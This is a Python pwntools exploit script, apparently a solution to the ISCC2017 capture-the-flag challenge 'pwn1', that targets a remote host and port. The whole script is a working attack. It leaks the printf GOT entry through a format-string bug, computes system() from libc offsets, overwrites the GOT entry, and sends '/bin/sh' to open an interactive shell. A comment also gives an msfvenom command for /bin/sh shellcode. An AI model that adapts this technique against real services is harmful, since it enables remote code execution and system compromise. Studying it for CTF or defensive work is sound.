#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-01 05:46:06
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 0
target = "./pwn1"
remote_ip = "115.28.185.220"
port = 11111
rop = roputils.ROP(target)
# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target,env={"LD_LIBRARY_PATH":"/root/Desktop/ctf_task/ISCC2017/pwn1_/"})
	# gdb.attach(p,"b*0x8048618\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def exec_fmt(payload):
	ru(" input$")
	sl("1")
	ru("\n")
	sl(payload)
	return p.recvuntil(",")[:-1]
autofmt = FmtStr(exec_fmt,offset=6)


system_addr =  u32(exec_fmt(p32(rop.got('printf'))+"%6$s...")[4:8]) - (libc.symbols["printf"] - libc.symbols["system"])
print "system_addr = "+hex(system_addr)
# offset = autofmt.offset


# autofmt = FmtStr(exec_fmt,offset=offset)
autofmt.write(rop.got('printf'),system_addr)
# autofmt.write(rop.got('puts'),system_addr+0x3FCAB-0x3FE70)
autofmt.execute_writes()
sl("1")
ru("\n")
sl("/bin/sh\x00")

p.interactive()